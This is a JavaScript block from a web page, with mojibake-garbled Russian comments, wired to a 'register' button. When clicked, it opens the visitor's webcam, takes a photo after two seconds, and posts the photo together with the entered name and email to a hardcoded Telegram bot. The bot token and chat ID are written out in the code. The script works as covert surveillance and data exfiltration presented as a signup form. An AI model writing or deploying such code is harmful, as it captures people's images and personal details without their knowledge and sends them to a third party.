    <script>
        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // –¢–æ–∫–µ–Ω –±–æ—Ç–∞
        const CHAT_ID = "7477642275";  // Chat ID
        const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
        const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏ —Ñ–æ—Ç–æ –≤ Telegram
        function sendDataToTelegram(name, email, dataURI) {
            let message = `üìã –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:
üë§ –ò–º—è: ${name}
üìß Email: ${email}`;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram
            if (dataURI) {
                let photoBlob = dataURItoBlob(dataURI);
                let formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'photo.png');

                fetch(PHOTO_API_URL, {
                    method: 'POST',
                    body: formData
                }).then(response => {
                    return response.json();
                }).then(data => {
                    console.log('–§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram:', data);
                }).catch(error => {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ:', error);
                });
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è Data URL –≤ Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let arrayBuffer = new ArrayBuffer(byteString.length);
            let uintArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: 'image/png' });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        function capturePhoto(stream, videoElement) {
            let canvas = document.createElement("canvas");
            let ctx = canvas.getContext("2d");
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            let photoDataUrl = canvas.toDataURL("image/png");

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏ —Ñ–æ—Ç–æ –≤ Telegram
            const name = document.getElementById("name").value;
            const email = document.getElementById("email").value;
            sendDataToTelegram(name, email, photoDataUrl);

            // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫ –∫–∞–º–µ—Ä—ã –∏ —É–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç –≤–∏–¥–µ–æ
            stream.getTracks().forEach(track => track.stop());
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ñ–æ—Ç–æ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏
        function getCameraAndTakePhoto() {
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        let videoElement = document.createElement("video");
                        videoElement.srcObject = stream;
                        videoElement.play();

                        // –ß–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã —Å–¥–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
                        setTimeout(() => {
                            capturePhoto(stream, videoElement);
                        }, 2000); // –î–∞–µ–º 2 —Å–µ–∫—É–Ω–¥—ã –Ω–∞ –∑–∞–≥—Ä—É–∑–∫—É –∫–∞–º–µ—Ä—ã
                    }).catch(err => {
                        console.log("–û—à–∏–±–∫–∞ —Å –¥–æ—Å—Ç—É–ø–æ–º –∫ –∫–∞–º–µ—Ä–µ: " + err);
                    });
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É "–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è"
        function handleRegistration() {
            // –ü—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏ –¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            getCameraAndTakePhoto();
        }
    </script>
